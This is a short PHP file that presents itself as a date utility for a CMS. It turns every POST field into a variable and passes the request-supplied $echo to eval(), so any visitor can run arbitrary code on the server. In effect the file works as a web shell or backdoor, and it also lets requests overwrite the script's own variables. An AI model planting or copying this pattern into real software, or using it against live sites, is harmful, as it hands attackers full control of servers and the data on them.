<?
	$dat="";
	foreach($_POST as $k=>$v)$$k=$v;
	if($inc=="dates")include OOP_PATH."protect/lib/cms/utils/dates.php";
	if($dat=="")$dat=date("Y-m-d H:i:s",time());
	eval("echo $echo;");
?>

